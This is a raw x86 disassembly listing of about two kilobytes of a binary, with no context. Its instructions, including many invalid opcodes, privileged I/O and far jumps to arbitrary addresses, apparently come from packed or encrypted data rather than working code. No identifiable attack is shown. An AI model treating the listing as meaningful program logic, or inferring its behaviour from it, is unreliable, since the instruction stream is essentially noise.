  4151ec:	mov    dh,0x7c
  4151ee:	add    bl,BYTE PTR gs:[ebx+eiz*8]
  4151f2:	xor    eax,0x7b340315
  4151f7:	mov    dl,0x41
  4151f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4151fa:	loope  0x415248
  4151fc:	scas   eax,DWORD PTR es:[edi]
  4151fd:	sbb    ah,BYTE PTR [ecx+0xdab6036]
  415203:	shr    BYTE PTR [ebx+0x43],1
  415206:	push   edi
  415207:	or     DWORD PTR [ebp+0x68],ecx
  41520a:	ss nop
  41520c:	mov    ch,dl
  41520e:	mov    cl,0xff
  415210:	dec    eax
  415211:	cmp    esp,DWORD PTR [ecx+0x1679f488]
  415217:	(bad)  
  415219:	fsub   DWORD PTR [ebx-0x50bee03]
  41521f:	aad    0x51
  415221:	dec    ecx
  415222:	popf   
  415223:	inc    ebx
  415224:	les    edi,FWORD PTR ds:[eax+ebp*4-0x5e5ba4ba]
  41522c:	(bad)
  41522f:	jl     0x415203
  415231:	outs   dx,DWORD PTR ds:[esi]
  415232:	outs   dx,BYTE PTR ds:[esi]
  415233:	stos   DWORD PTR es:[edi],eax
  415234:	pop    ebx
  415235:	and    bh,BYTE PTR [ebp-0x16]
  415238:	loop   0x4151ef
  41523a:	xchg   BYTE PTR [ecx-0x242ae034],al
  415240:	mov    ah,0xb7
  415242:	push   ebp
  415243:	sub    BYTE PTR es:0x68cb08b5,0xf2
  41524b:	mov    ds:0xbec9a173,al
  415250:	shr    DWORD PTR [esp+eax*4],0x1f
  415254:	inc    ebp
  415255:	retf   0x36b5
  415258:	nop
  415259:	std    
  41525a:	push   ss
  41525b:	nop
  41525c:	repz int3 
  41525e:	push   ds
  41525f:	daa    
  415260:	and    dh,BYTE PTR [eax+esi*2]
  415263:	(bad)  
  415265:	arpl   WORD PTR [ebx+0x6a],dx
  415268:	jg     0x4152d6
  41526a:	dec    edi
  41526b:	out    0x4f,al
  41526d:	dec    eax
  41526e:	les    ebp,FWORD PTR [edx+eiz*4-0x53b92c9e]
  415275:	mov    bl,cl
  415277:	outs   dx,DWORD PTR ds:[esi]
  415278:	jae    0x415214
  41527a:	jg     0x41522d
  41527c:	cmp    BYTE PTR [ebx+eiz*2],ch
  41527f:	cmp    dl,BYTE PTR [edi-0x27033ccf]
  415285:	push   0x8f0cd438
  41528a:	pop    ebp
  41528b:	and    al,0x3d
  41528d:	mov    dh,0x98
  41528f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415290:	and    edx,DWORD PTR [ecx-0x360d8925]
  415296:	pop    edx
  415297:	sbb    BYTE PTR [ecx],al
  415299:	cld    
  41529a:	loopne 0x415313
  41529c:	jbe    0x41531a
  41529e:	std    
  41529f:	sub    BYTE PTR [ebp+0x2b8bc264],dl
  4152a5:	pop    ebx
  4152a6:	ret    
  4152a7:	mov    cl,0x6b
  4152a9:	push   edi
  4152aa:	mov    al,ds:0xbc3b102f
  4152af:	jbe    0x415256
  4152b1:	scas   eax,DWORD PTR es:[edi]
  4152b2:	shr    esp,cl
  4152b4:	jle    0x4152fb
  4152b6:	inc    eax
  4152b7:	pop    esi
  4152b8:	pop    es
  4152b9:	xor    eax,0xf9a761e2
  4152be:	or     DWORD PTR [ebx+0x6c],ecx
  4152c1:	retf   
  4152c2:	jle    0x415248
  4152c4:	shl    al,0x6f
  4152c7:	jns    0x415282
  4152c9:	lock pusha 
  4152cb:	ss pop ecx
  4152cd:	mov    BYTE PTR [esi],dh
  4152cf:	add    BYTE PTR [esi+0x35],bl
  4152d2:	les    ebp,FWORD PTR [ebp+0x2626cd18]
  4152d8:	pop    esi
  4152d9:	stc    
  4152da:	out    0x77,al
  4152dc:	lods   al,BYTE PTR ds:[esi]
  4152dd:	std    
  4152de:	pop    ebp
  4152df:	mov    ebp,0x761dce0a
  4152e4:	mov    esi,0xdd3df9a8
  4152e9:	and    al,0xf8
  4152eb:	dec    edx
  4152ec:	add    esi,DWORD PTR fs:[esi+0x553c7525]
  4152f3:	dec    esp
  4152f4:	mov    eax,ds:0xd396a745
  4152f9:	scas   al,BYTE PTR es:[edi]
  4152fa:	ret    
  4152fb:	or     BYTE PTR [esi-0x572dd310],0xe2
  415302:	icebp  
  415303:	mov    bh,0x7d
  415305:	push   0x6a
  415307:	lahf   
  415308:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415309:	pop    edx
  41530a:	and    DWORD PTR [ebx-0x62],eax
  41530d:	add    BYTE PTR [eax-0x56],bh
  415310:	stos   BYTE PTR es:[edi],al
  415311:	fs ins BYTE PTR es:[edi],dx
  415313:	out    0x12,eax
  415315:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415316:	mov    ebx,0x1f689130
  41531b:	push   ds
  41531c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41531d:	push   edi
  41531e:	push   ebx
  41531f:	mov    al,0x63
  415321:	add    eax,DWORD PTR [eax-0x21]
  415324:	lock dec ebp
  415326:	inc    ecx
  415327:	(bad)  
  415328:	xchg   edi,eax
  415329:	hlt    
  41532a:	xor    eax,0xcd97e22d
  41532f:	fst    QWORD PTR [ebp-0x59d29bc4]
  415335:	xchg   ebx,eax
  415336:	test   DWORD PTR [ebx-0x32],edx
  415339:	or     al,0xa2
  41533b:	lock pop ebp
  41533d:	addr16 je 0x415335
  415340:	repz dec edi
  415342:	pop    ds
  415343:	lds    ebx,FWORD PTR [eiz*8-0x2a8301b4]
  41534a:	adc    bl,BYTE PTR [eax+0x1fc1d4c1]
  415350:	jg     0x4153cb
  415352:	pop    eax
  415353:	add    ebp,DWORD PTR ss:[edi]
  415356:	mov    bh,0xdc
  415358:	inc    ebx
  415359:	jne    0x415333
  41535b:	test   eax,0x4b29fac6
  415360:	ins    DWORD PTR es:[edi],dx
  415361:	je     0x41531f
  415363:	aam    0xb1
  415365:	je     0x4153ce
  415367:	inc    esp
  415368:	mov    edi,0x470fb3c
  41536d:	(bad)  
  41536e:	dec    esp
  41536f:	jp     0x415305
  415371:	mov    edx,eax
  415373:	inc    esp
  415374:	outs   dx,DWORD PTR ds:[esi]
  415375:	(bad)
  415379:	fsubr  QWORD PTR [eax-0x781d974]
  41537f:	pop    ecx
  415380:	pop    edx
  415381:	pop    ss
  415382:	(bad)  [ecx]
  415384:	loop   0x41530a
  415386:	pop    eax
  415387:	adc    al,0xf
  415389:	lds    ecx,FWORD PTR es:[esi]
  41538c:	and    dh,BYTE PTR [esi]
  41538e:	dec    ebx
  41538f:	test   al,0x91
  415391:	lahf   
  415392:	jge    0x415401
  415394:	shl    ebx,1
  415396:	mov    ds:0x4bf037b8,al
  41539b:	lahf   
  41539c:	jnp    0x41533f
  41539e:	sbb    eax,0x33f028f6
  4153a3:	call   DWORD PTR [esi+edx*4-0x5ceb9d3f]
  4153aa:	icebp  
  4153ab:	bound  eax,QWORD PTR [edx-0x4d]
  4153ae:	dec    ebx
  4153af:	sub    al,0x38
  4153b1:	push   esp
  4153b2:	clc    
  4153b3:	xchg   esi,eax
  4153b4:	rol    bl,cl
  4153b6:	mov    edx,esp
  4153b8:	test   DWORD PTR [edi],edx
  4153ba:	xchg   esi,eax
  4153bb:	fld    QWORD PTR [ecx-0x78c10c0d]
  4153c1:	jmp    0x3474:0x558357a4
  4153c8:	jb     0x41534d
  4153ca:	mov    dl,BYTE PTR [ecx+edx*1-0x7177b124]
  4153d1:	sbb    ebp,DWORD PTR [edx+0x1a]
  4153d4:	add    cl,BYTE PTR [edx]
  4153d6:	lock push ss
  4153d8:	(bad)  [ebx]
  4153da:	mov    eax,0xb87676f7
  4153df:	xlat   BYTE PTR ds:[ebx]
  4153e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4153e1:	addr16 test dl,ch
  4153e4:	rcr    BYTE PTR [esi-0x69],0x8b
  4153e8:	inc    ebp
  4153e9:	imul   ebx,ebp,0x1b
  4153ec:	inc    eax
  4153ed:	mov    dl,bl
  4153ef:	lahf   
  4153f0:	mov    esi,0xcf033386
  4153f5:	dec    ecx
  4153f6:	sbb    BYTE PTR [edi],cl
  4153f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4153f9:	mov    bh,0x21
  4153fb:	stos   BYTE PTR es:[edi],al
  4153fc:	and    eax,0xcdb6e1af
  415401:	int    0x6d
  415403:	xchg   BYTE PTR [eax-0x394f2a3c],bl
  415409:	retf   0x5763
  41540c:	cmp    BYTE PTR [ecx+0x255c2ebf],0x5
  415413:	mov    DWORD PTR [ecx-0x6f],ebx
  415416:	shl    DWORD PTR [esi+0x5f],cl
  415419:	pop    esi
  41541a:	sti    
  41541b:	pop    edi
  41541c:	jnp    0x415454
  41541e:	out    0x2,al
  415420:	or     al,0x9c
  415422:	xor    cl,BYTE PTR [ebp+0x7a44412a]
  415428:	jns    0x41548e
  41542a:	sub    esi,ecx
  41542c:	inc    eax
  41542d:	push   0xffffffb8
  41542f:	rcr    esi,cl
  415431:	aas    
  415432:	push   esi
  415433:	outs   dx,BYTE PTR ds:[esi]
  415434:	sbb    al,0xa5
  415436:	sub    DWORD PTR [esi-0x55],ebx
  415439:	out    0x50,eax
  41543b:	leave  
  41543c:	popf   
  41543d:	test   DWORD PTR [edi+0xd],ecx
  415440:	aaa    
  415441:	(bad)  
  415442:	fwait
  415443:	sti    
  415444:	pop    ecx
  415445:	int    0x91
  415447:	mov    BYTE PTR [eax+edx*1-0x51],bl
  41544b:	sbb    eax,0x49b6b74c
  415450:	pop    edx
  415451:	fisttp DWORD PTR [ebp+ebp*4-0xd]
  415455:	and    eax,0xa0f22eb4
  41545a:	lds    ecx,FWORD PTR [esi-0x62497bd6]
  415460:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415461:	xchg   BYTE PTR [edx],al
  415463:	push   edi
  415464:	rcl    BYTE PTR [ecx-0x44],0xe1
  415468:	cld    
  415469:	inc    DWORD PTR [ebx+0x3faa656]
  41546f:	dec    ebx
  415470:	enter  0x7288,0x9e
  415474:	imul   ecx,DWORD PTR [edx-0x10017201],0xce803ef1
  41547e:	pop    ss
  41547f:	dec    edi
  415480:	pop    ss
  415481:	iret   
  415482:	inc    ebp
  415483:	cmc    
  415484:	add    bh,dh
  415486:	xchg   edx,eax
  415487:	data16 sub al,0xe5
  41548a:	pushf  
  41548b:	inc    ebx
  41548c:	shl    BYTE PTR [ebp-0x2d],1
  41548f:	dec    esi
  415490:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415491:	aaa    
  415492:	mov    esi,0xabb87732
  415497:	int3   
  415498:	add    al,0x3c
  41549a:	retf   
  41549b:	call   0xaa5f988a
  4154a0:	nop
  4154a1:	lods   al,BYTE PTR ds:[esi]
  4154a2:	pop    esi
  4154a3:	add    edi,ebx
  4154a5:	shl    DWORD PTR [ebx+0x17d34553],cl
  4154ab:	push   ecx
  4154ac:	inc    esp
  4154ad:	jle    0x41550d
  4154af:	std    
  4154b0:	hlt    
  4154b1:	dec    edi
  4154b2:	imul   esp,DWORD PTR [edi-0x36],0x3e
  4154b6:	dec    ebp
  4154b7:	push   esi
  4154b8:	fbld   TBYTE PTR [esi+0x4b0ac780]
  4154be:	iret   
  4154bf:	pop    esi
  4154c0:	mov    eax,DWORD PTR [edx]
  4154c2:	lods   eax,DWORD PTR ds:[esi]
  4154c3:	lds    ebx,FWORD PTR [esi]
  4154c5:	mov    ds:0x44425243,al
  4154ca:	sub    bh,cl
  4154cc:	es aas 
  4154ce:	aad    0x1b
  4154d0:	sti    
  4154d1:	jns    0x4154e9
  4154d3:	mov    ebp,0x20eae07
  4154d8:	jmp    0x4154b1
  4154da:	(bad)  
  4154dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4154dd:	cmp    DWORD PTR [esi+0x53],esi
  4154e0:	je     0x4154bb
  4154e2:	hlt    
  4154e3:	xor    al,0x92
  4154e5:	daa    
  4154e6:	and    cl,BYTE PTR [edx]
  4154e8:	sub    al,0x70
  4154ea:	jmp    0x26d83801
  4154ef:	jle    0x4154dc
  4154f1:	int3   
  4154f2:	jp     0x4154bd
  4154f4:	lock data16 jp 0x4154cb
  4154f8:	fmul   DWORD PTR [ecx]
  4154fa:	or     BYTE PTR es:[eax-0x18],ch
  4154fe:	add    ch,0xe5
  415501:	jno    0x415539
  415503:	ins    BYTE PTR es:[edi],dx
  415504:	inc    ecx
  415505:	js     0x415526
  415507:	(bad)  
  415508:	std    
  415509:	xchg   ebx,eax
  41550a:	in     eax,dx
  41550b:	call   0xf894:0x599c1a10
  415512:	pop    ds
  415513:	or     DWORD PTR [ebp-0x29],ebx
  415516:	xor    edi,ebx
  415518:	push   esi
  415519:	mov    ds:0x35f43371,eax
  41551e:	pop    es
  41551f:	jnp    0x415542
  415521:	xchg   ebx,eax
  415522:	out    dx,al
  415523:	repnz mov dl,0x95
  415526:	inc    ecx
  415527:	into   
  415528:	cs sub eax,0x57c20ce4
  41552e:	add    dl,BYTE PTR [eax-0x31]
  415531:	aam    0xb5
  415533:	xchg   ecx,eax
  415534:	rcr    DWORD PTR [ebp+eiz*4-0x2d],1
  415538:	cmp    edi,DWORD PTR [esi]
  41553a:	xor    eax,DWORD PTR [ecx+0x1376d3bf]
  415540:	cdq    
  415541:	mov    eax,es:0x6c64f2cd
  415547:	call   0x46be:0x687e7dba
  41554e:	aas    
  41554f:	enter  0x58f,0x9f
  415553:	ins    DWORD PTR es:[edi],dx
  415554:	imul   ecx,DWORD PTR [esi],0xffffffae
  415557:	push   0xb9e8219d
  41555c:	cmp    al,0xd2
  41555e:	iret   
  41555f:	sub    al,0xa7
  415561:	test   DWORD PTR [ebx+eiz*4+0x6],0xdb1bde53
  415569:	es cs into 
  41556c:	xor    esp,edx
  41556e:	sbb    al,0x5c
  415570:	pop    esp
  415571:	aam    0x65
  415573:	ins    BYTE PTR es:[edi],dx
  415574:	dec    edi
  415575:	xor    BYTE PTR [esi+0x71],bl
  415578:	sbb    BYTE PTR [eax+edi*4+0x211fe4fc],al
  41557f:	jno    0x415582
  415581:	xor    ecx,esp
  415583:	xor    BYTE PTR [edx],bl
  415585:	enter  0x80cf,0x88
  415589:	cmc    
  41558a:	mov    esi,DWORD PTR [ebp-0x14]
  41558d:	lds    ebx,FWORD PTR [ebx-0x601882b7]
  415593:	cmp    eax,DWORD PTR [edi+ebx*1-0x6221d749]
  41559a:	dec    eax
  41559b:	(bad)  
  41559c:	xchg   edx,eax
  41559d:	add    eax,0x56b0c0fb
  4155a2:	xchg   edx,eax
  4155a3:	(bad)  
  4155a4:	or     DWORD PTR [eax-0x547956ec],ebp
  4155aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4155ab:	mov    esi,?
  4155ad:	sahf   
  4155ae:	and    BYTE PTR [ebx+0x71],dl
  4155b1:	test   eax,0x2d309568
  4155b6:	jge    0x4155ae
  4155b8:	call   0xa0cf16f8
  4155bd:	pop    edx
  4155be:	into   
  4155bf:	and    BYTE PTR [ecx+0x5d],dh
  4155c2:	dec    esi
  4155c3:	xchg   dh,ah
  4155c5:	imul   edx,DWORD PTR [esi-0xf],0x5c
  4155c9:	xor    eax,0xb1218ec9
  4155ce:	xor    BYTE PTR [ebx],ah
  4155d0:	je     0x415642
  4155d2:	xchg   esi,eax
  4155d3:	xor    al,0xe
  4155d5:	fld    TBYTE PTR [ebp-0x3a94b092]
  4155db:	in     al,dx
  4155dc:	xchg   edx,eax
  4155dd:	or     ah,ch
  4155df:	xchg   edx,eax
  4155e0:	ret    
  4155e1:	in     al,dx
  4155e2:	lods   eax,DWORD PTR ds:[esi]
  4155e3:	xchg   BYTE PTR [eax+eiz*2+0x52],dl
  4155e7:	mov    ebp,0x907dc9ae
  4155ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4155ed:	aas    
  4155ee:	lods   eax,DWORD PTR ds:[esi]
  4155ef:	inc    esi
  4155f0:	ins    DWORD PTR es:[edi],dx
  4155f1:	outs   dx,DWORD PTR ds:[esi]
  4155f2:	in     al,dx
  4155f3:	jnp    0x4155e4
  4155f5:	aaa    
  4155f6:	and    cl,BYTE PTR [ebx+0x1049406]
  4155fc:	and    eax,0x5db6ebbb
  415601:	arpl   dx,di
  415603:	jge    0x415669
  415605:	xchg   esi,eax
  415606:	sbb    eax,0x26b675b7
  41560b:	xchg   BYTE PTR [esi+0x16f14e8d],cl
  415611:	addr16 out dx,eax
  415613:	sbb    DWORD PTR [esi+0x7a],edx
  415616:	push   ds
  415617:	out    0x83,al
  415619:	or     bl,0x3f
  41561c:	repnz lods al,BYTE PTR ds:[esi]
  41561e:	jns    0x415636
  415620:	imul   ebp,DWORD PTR cs:[edx],0xcfacd413
  415627:	mov    esp,0xe41b9702
  41562c:	dec    ebp
  41562d:	leave  
  41562e:	mov    dl,0x5d
  415630:	dec    edi
  415631:	add    bh,al
  415633:	add    BYTE PTR [ecx-0x40],ch
  415636:	rol    BYTE PTR [esi-0x69],0x35
  41563a:	cwde   
  41563b:	mov    cl,0x64
  41563d:	xor    DWORD PTR [edi-0x3f],edi
  415640:	mov    edi,0x749b5997
  415645:	test   al,0xf0
  415647:	mov    al,0x8f
  415649:	icebp  
  41564a:	data16 mov WORD PTR [edi+0x4c64cf9f],?
  415651:	imul   esp,DWORD PTR [ecx-0x1572562f],0x79d148ed
  41565b:	div    BYTE PTR [edx-0x4e]
  41565e:	es push edi
  415660:	dec    ebp
  415661:	mov    ch,0x35
  415663:	and    DWORD PTR [edi+edx*4+0x1da602bf],edx
  41566a:	adc    dh,BYTE PTR [esi+0x70]
  41566d:	mov    ch,0xec
  41566f:	gs pop eax
  415671:	rcr    edx,0xa4
  415674:	jecxz  0x415636
  415676:	push   eax
  415677:	or     eax,0xaf571ed0
  41567c:	mov    dl,0x1e
  41567e:	ds adc eax,0x8d163993
  415684:	lods   al,BYTE PTR ds:[esi]
  415685:	bound  ecx,QWORD PTR [ebx+0x62]
  415688:	fadd   DWORD PTR [eax-0x16]
  41568b:	push   0x27aae84d
  415690:	arpl   WORD PTR [ebx-0x5a05c5f9],dx
  415696:	fwait
  415697:	rol    edi,0xe6
  41569a:	sub    al,0xa9
  41569c:	dec    ecx
  41569d:	sbb    eax,0xbd28b0c2
  4156a2:	sub    BYTE PTR [esi+edi*8],bl
  4156a5:	cmp    al,0xb
  4156a7:	loop   0x415644
  4156a9:	inc    edi
  4156aa:	ss xchg ecx,eax
  4156ac:	pop    ecx
  4156ad:	mov    ebx,DWORD PTR [ebx-0x29]
  4156b0:	and    al,0xd3
  4156b2:	mov    cl,BYTE PTR [ebp+0x41]
  4156b5:	(bad)  
  4156b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4156b8:	inc    ecx
  4156b9:	test   al,0xf7
  4156bb:	pusha  
  4156bc:	pop    ebx
  4156bd:	pop    eax
  4156be:	lods   eax,DWORD PTR ds:[esi]
  4156bf:	mov    ds:0xc8fd4bf9,eax
  4156c4:	pop    esi
  4156c5:	hlt    
  4156c6:	cmp    al,0x70
  4156c8:	mov    al,ds:0x805ee38b
  4156cd:	mov    WORD PTR [ecx],?
  4156cf:	stos   BYTE PTR es:[edi],al
  4156d0:	loop   0x41565a
  4156d2:	jo     0x4156c4
  4156d4:	in     eax,dx
  4156d5:	and    al,0xcc
  4156d7:	out    0x5a,eax
  4156d9:	jecxz  0x415714
  4156db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4156dc:	xor    BYTE PTR [edi],cl
  4156de:	pushf  
  4156df:	fidivr DWORD PTR [edi+0x3b8c5ee8]
  4156e5:	sub    eax,0xa9d64723
  4156ea:	jb     0x415756
  4156ec:	int3   
  4156ed:	adc    BYTE PTR [ebx+0x7f64f737],0x5e
  4156f4:	outs   dx,BYTE PTR ds:[esi]
  4156f5:	scas   al,BYTE PTR es:[edi]
  4156f6:	and    dl,ah
  4156f8:	cmp    DWORD PTR [edx+0x796a0af5],eax
  4156fe:	test   DWORD PTR [ebp+0x71110291],ebp
  415704:	(bad)  
  415705:	or     al,0x6a
  415707:	fnstcw WORD PTR [ebp+0x6885925f]
  41570d:	push   es
  41570e:	inc    ebx
  41570f:	pop    ss
  415710:	pop    esp
  415711:	rcr    DWORD PTR [edx],0x8c
  415714:	das    
  415715:	(bad)  
  415716:	loopne 0x4156ff
  415718:	sbb    eax,0xee15f0a7
  41571d:	ret    0x4e63
  415720:	push   ebx
  415721:	imul   eax,DWORD PTR [ebp+ecx*8+0x41],0x648d3674
  415729:	test   cl,dh
  41572b:	xchg   ebx,eax
  41572c:	adc    DWORD PTR ds:[edx],edi
  41572f:	cmp    DWORD PTR [esp+edx*4],esi
  415732:	pushf  
  415733:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415734:	gs jmp 0xafca:0x1df872df
  41573c:	ud1    eax,DWORD PTR [edx-0x13]
  415740:	popa   
  415741:	idiv   DWORD PTR [ebx+0x624d152]
  415747:	je     0x41578c
  415749:	mov    edx,0xd34f1eb1
  41574e:	dec    eax
  41574f:	add    BYTE PTR [eax-0x4b],ah
  415752:	test   eax,0xe8cffc2b
  415757:	ds jo  0x4157a7
  41575a:	(bad)  [eax-0x33d576df]
  415760:	pop    edx
  415761:	test   edi,0x78fb9a82
  415767:	jl     0x4156ee
  415769:	push   edi
  41576a:	xchg   ebp,eax
  41576b:	lock repnz sbb cx,bx
  415770:	mov    al,ds:0x8712c2ba
  415775:	mov    dl,0x72
  415777:	mov    ah,BYTE PTR [edi+0x17063315]
  41577d:	call   0x4060bbb2
  415782:	call   0x7ddf:0xb07f6a1c
  415789:	mov    dl,0x3f
  41578b:	mov    esp,0xe0095b71
  415790:	shr    DWORD PTR [eax-0x6f02b3d3],1
  415796:	je     0x415720
  415798:	ret    
  415799:	mov    ds:0x33e95d9c,eax
  41579e:	sub    eax,0xaee9a162
  4157a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4157a4:	mov    ch,0x99
  4157a6:	loopne 0x4157aa
  4157a8:	pop    ebx
  4157a9:	movmskps ecx,xmm6
  4157ac:	xchg   edx,eax
  4157ad:	jb     0x4157e3
  4157af:	retf   0xa975
  4157b2:	mov    ebx,0xa9a0ad54
  4157b7:	ds jae 0x415744
  4157ba:	or     eax,0x65f2e16
  4157bf:	aas    
  4157c0:	fst    DWORD PTR [ebx-0x234f488d]
  4157c6:	pop    ebx
  4157c7:	jl     0x415814
  4157c9:	mov    ds:0xdba6fdb6,eax
  4157ce:	sub    eax,edx
  4157d0:	xor    DWORD PTR [edi+0x51],esi
  4157d3:	mov    edx,0xd60e0c82
  4157d8:	inc    eax
  4157d9:	push   ebx
  4157da:	std    
  4157db:	sbb    al,0x8c
  4157dd:	jmp    DWORD PTR [eax+0x45d7f3c1]
  4157e3:	pop    ecx
  4157e4:	add    eax,DWORD PTR [eax]
  4157e6:	test   eax,0xb6a4afd6
  4157eb:	push   eax
  4157ec:	mov    al,ds:0x7a9644c6
  4157f1:	aad    0xa7
  4157f3:	jb     0x4157ab
  4157f5:	test   eax,0x3b232352
  4157fa:	jmp    0x4157e5
  4157fc:	pusha  
  4157fd:	push   ds
  4157fe:	repz imul DWORD PTR ds:0x9a09a3be
  415805:	psubd  mm5,QWORD PTR [ebx+0x5957e73a]
  41580c:	lahf   
  41580d:	popf   
  41580e:	sbb    edi,DWORD PTR ds:0xa503c68d
  415814:	mov    dl,BYTE PTR [eax+0x16820a1e]
  41581a:	bswap  ebp
  41581c:	cmp    ch,BYTE PTR [edx]
  41581e:	dec    esi
  41581f:	js     0x415892
  415821:	mov    bl,0xc2
  415823:	xor    al,0xf7
  415825:	xor    dl,dl
  415827:	mov    dh,0x25
  415829:	or     DWORD PTR [esi-0x335a0cf3],ecx
  41582f:	call   0x6dde:0xd4c4f443
  415836:	pop    esp
  415837:	jns    0x41584b
  415839:	je     0x4158ac
  41583b:	pop    es
  41583c:	aam    0x90
  41583e:	imul   edi,DWORD PTR [edi+esi*1+0x48],0x60
  415843:	cli    
  415844:	or     ebx,DWORD PTR [ebp+0x47962d5c]
  41584a:	(bad)  
  41584b:	or     DWORD PTR [edx+0x56],esi
  41584e:	sti    
  41584f:	mov    al,0xfd
  415851:	test   BYTE PTR [edx+0x594e95aa],0xf4
  415858:	mov    BYTE PTR [ecx-0x5f],bl
  41585b:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  41585d:	cmp    ebp,eax
  41585f:	icebp  
  415860:	xchg   edx,eax
  415861:	fild   WORD PTR [ebp-0x2c]
  415864:	sbb    bl,al
  415866:	push   0x52c368f7
  41586b:	push   edi
  41586c:	clc    
  41586d:	jge    0x415811
  41586f:	outs   dx,BYTE PTR ds:[esi]
  415870:	frstor [esi]
  415872:	in     eax,0x22
  415874:	gs pop edi
  415876:	hlt    
  415877:	stos   DWORD PTR es:[edi],eax
  415878:	push   edi
  415879:	or     DWORD PTR [esi-0x6695d597],eax
  41587f:	sbb    ch,dl
  415881:	sbb    DWORD PTR [ebx+0x5e813602],ecx
  415887:	in     al,dx
  415888:	or     eax,0xe96ff380
  41588d:	ret    0x1b9e
  415890:	add    bl,dh
  415892:	mov    BYTE PTR [eax],dh
  415894:	jae    0x415885
  415896:	push   cs
  415897:	add    eax,0x83d8e40
  41589c:	push   ds
  41589d:	bound  edx,QWORD PTR [eax-0x62]
  4158a0:	stc    
  4158a1:	sbb    DWORD PTR [esi-0x59641a62],esp
  4158a7:	dec    esp
  4158a8:	dec    ecx
  4158a9:	sbb    ch,0x93
  4158ac:	xor    BYTE PTR [eax+0x1a],dh
  4158af:	add    al,0xf8
  4158b1:	jno    0x4158c1
  4158b3:	cli    
  4158b4:	(bad)  
  4158b6:	frstor [edx]
  4158b8:	imul   ebp,DWORD PTR [ebp+0xc],0x72
  4158bc:	add    al,0xf5
  4158be:	jnp    0x4158e2
  4158c0:	jae    0x4158ec
  4158c2:	cli    
  4158c3:	jne    0x415908
  4158c5:	(bad)  
  4158c7:	sub    bh,ah
  4158c9:	cmp    BYTE PTR [ebp-0x50b1d],bh
  4158cf:	outs   dx,BYTE PTR ds:[esi]
  4158d0:	and    dl,ah
  4158d2:	or     eax,0x22956603
  4158d7:	or     al,0xf9
  4158d9:	stc    
  4158da:	pcmpgtb mm0,QWORD PTR [ecx+0x5b]
  4158de:	iret   
  4158df:	or     ebx,DWORD PTR [esi+0x779442c9]
  4158e5:	les    ebx,FWORD PTR [ecx]
  4158e7:	dec    edx
  4158e8:	jecxz  0x41592a
  4158ea:	lea    esp,[edx+edi*1]
  4158ed:	cmp    eax,0x1f22a660
  4158f2:	mov    esi,DWORD PTR [edi]
  4158f4:	bound  eax,QWORD PTR [edx-0x56]
  4158f7:	mov    ds:0x60c79e69,al
  4158fc:	aad    0x4
  4158fe:	adc    DWORD PTR [esi],0x75
  415901:	loopne 0x415960
  415903:	mov    ah,BYTE PTR [esi]
  415905:	jecxz  0x415940
  415907:	add    DWORD PTR [esi-0x6c336403],edi
  41590d:	sti    
  41590e:	xor    edx,DWORD PTR [ecx]
  415910:	loop   0x4158ac
  415912:	fisub  DWORD PTR [edi-0x1010411]
  415918:	or     dl,0x7e
  41591b:	test   edi,edx
  41591d:	mov    eax,0x3f8fd8f4
  415922:	clc    
  415923:	test   BYTE PTR [eax+0x6113002b],dh
  415929:	test   al,0x46
  41592b:	push   cs
  41592c:	jae    0x415942
  41592e:	lods   al,BYTE PTR ds:[esi]
  41592f:	lds    esi,FWORD PTR [esi+0x54]
  415932:	and    BYTE PTR [edi+0x6e],bl
  415935:	ds jae 0x415974
  415938:	sbb    BYTE PTR ds:0x61a1aee7,0xe8
  41593f:	retf   0x2792
  415942:	lahf   
  415943:	or     al,0x50
  415945:	mov    ch,0x68
  415947:	mov    ah,0x41
  415949:	mov    dl,BYTE PTR [edx-0x16]
  41594c:	aam    0x4e
  41594e:	jge    0x41597a
  415950:	or     BYTE PTR [ebx+ebx*8-0x9],cl
  415954:	push   0xdb7c3997
  415959:	mov    cl,0x84
  41595b:	sbb    DWORD PTR [esi],ecx
  41595d:	test   DWORD PTR [eax],ebp
  41595f:	adc    al,0xc2
  415961:	test   al,0xb7
  415963:	sahf   
  415964:	sbb    al,0xdc
  415966:	es (bad) 
  415968:	in     al,0x67
  41596a:	sub    al,0xdd
  41596c:	rcr    edi,cl
  41596e:	push   esp
  41596f:	xchg   ecx,eax
  415970:	imul   esi,DWORD PTR [edi-0xc1633a9],0x33fd8f48
  41597a:	mul    BYTE PTR [ecx+0x7b9e3469]
  415980:	mov    edx,DWORD PTR [edx-0x5b1246d8]
  415986:	xchg   DWORD PTR [esi],edi
  415988:	daa    
  415989:	dec    esp
  41598a:	jmp    0x9fb36053
  41598f:	xor    al,BYTE PTR [ecx]
  415991:	push   esi
  415992:	mov    dh,0x40
  415994:	cmp    eax,0xff05bc48
  415999:	push   0xf15c4b53
  41599e:	mov    BYTE PTR [ebp+0x48],cl
  4159a1:	pop    eax
  4159a2:	lea    eax,[esi]
  4159a4:	jmp    0xfbd7b602
  4159a9:	frstor [edx+0x53]
  4159ac:	dec    esp
  4159ad:	rcl    DWORD PTR [eax-0x3b65f9d3],0x94
  4159b4:	pop    edx
  4159b5:	add    bp,bp
  4159b8:	mov    eax,0x6764957
  4159bd:	jns    0x4159cb
  4159bf:	xchg   bl,bl
  4159c1:	dec    eax
  4159c2:	xor    DWORD PTR cs:[edi+0x68],eax
  4159c6:	sbb    BYTE PTR [esi-0x7935f577],al
  4159cc:	sub    al,0xe2
  4159ce:	inc    esi
  4159cf:	sub    eax,0x4dc66c89
  4159d4:	jecxz  0x415a2c
  4159d6:	call   0x45b8:0x97db9a93
  4159dd:	fcom   DWORD PTR [edx+0x74454814]
  4159e3:	fwait
